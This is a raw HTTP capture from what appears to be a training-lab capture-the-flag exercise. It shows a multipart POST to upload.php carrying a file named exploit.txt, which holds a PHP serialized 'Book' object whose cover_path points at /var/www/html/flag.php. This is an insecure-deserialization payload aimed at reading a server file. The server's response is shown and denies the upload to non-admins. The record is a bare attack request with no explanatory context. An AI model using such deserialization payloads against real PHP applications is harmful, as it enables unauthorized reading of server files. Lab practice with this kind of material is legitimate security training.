POST /upload.php HTTP/1.1
Host: web-80-164-90.cod-sa-east-1.hbtn.io
Cookie: PHPSESSID=cd6c3d6d85ed42c37c8891d9ce85acf0
Content-Length: 444
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Origin: https://web-80-164-90.cod-sa-east-1.hbtn.io
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydpvdOIYkAQrDVDLF
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://web-80-164-90.cod-sa-east-1.hbtn.io/upload.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

------WebKitFormBoundarydpvdOIYkAQrDVDLF
Content-Disposition: form-data; name="fileToUpload"; filename="exploit.txt"
Content-Type: text/plain

O:4:"Book":4:{s:5:"title";s:14:"Exploited Book";s:6:"author";s:8:"Attacker";s:10:"cover_path";s:22:"/var/www/html/flag.php";s:11:"cover_image";N;}

------WebKitFormBoundarydpvdOIYkAQrDVDLF
Content-Disposition: form-data; name="submit"

Upload File
------WebKitFormBoundarydpvdOIYkAQrDVDLF--


Response:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 06 Jun 2026 19:37:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 44

Access denied. Only admins can upload files.
